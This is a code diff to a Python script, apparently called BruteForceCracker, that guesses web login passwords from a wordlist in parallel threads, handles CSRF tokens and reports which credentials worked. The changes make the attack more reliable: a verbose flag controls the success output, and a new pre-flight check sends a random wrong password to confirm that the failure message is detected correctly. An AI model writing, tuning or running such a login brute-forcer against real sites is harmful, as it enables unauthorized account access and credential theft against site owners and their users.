@@ -25,6 +25,7 @@ import requests
 import time
 import sys
 import re
+import secrets
 from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -66,7 +67,7 @@ class BruteForceCracker:
             # print(f"Error getting CSRF token: {e}")
             return None, None
 
-    def crack(self, password):
+    def crack(self, password, verbose=False):
         # Create a new session for each attempt to avoid threading issues and ensure fresh cookies
         session = requests.Session()
 
@@ -98,12 +99,15 @@ class BruteForceCracker:
                 return False
 
             # Check if login was successful
+            # Returns False (FAIL) if error message found
+            # Returns True (SUCCESS) if error message NOT found
             if self.error_message in str(response.content) or self.error_message in response.text:
                 return False
             else:
-                print("\n[+] Success!")
-                print("Username: ---> " + self.username)
-                print("Password: ---> " + password)
+                if verbose:
+                    print("\n[+] Success!")
+                    print("Username: ---> " + self.username)
+                    print("Password: ---> " + password)
                 return True
         except Exception as e:
             # print(f"Request failed for {password}: {e}")
@@ -117,7 +121,7 @@ def crack_password_wrapper(password, cracker, counter_lock, counter):
         if count % 50 == 0:
             print(f"Tried {count} passwords...")
 
-    if cracker.crack(password):
+    if cracker.crack(password, verbose=True):
         return True, password
     return False, password
 
@@ -143,7 +147,22 @@ def main():
     else:
         print("[-] No CSRF token found or using a different protection method\n")
         cracker.csrf_detected = False
-    
+
+    # Pre-flight check to prevent false positives
+    print("[*] Verifying configuration with a random password...")
+    random_pass = secrets.token_hex(8)
+    if cracker.crack(random_pass, verbose=False):
+        print(f"\n[!] ERROR: False positive detected!")
+        print(f"[!] The script detected 'Success' for a known wrong password ('{random_pass}').")
+        print(f"[!] This means the Error Message you provided ('{error}') was NOT found in the server's response.")
+        print(f"[!] Please check:")
+        print(f"    1. Is the Error Message correct and exact?")
+        print(f"    2. Are the field names correct ({user_field}, {pass_field})?")
+        print(f"    3. Is the website returning the error in the HTML response body?")
+        return
+    else:
+        print("[+] Configuration verified. Error message was correctly found in the response.")
+
     try:
         f = open("passwords.txt", "r")
     except FileNotFoundError:
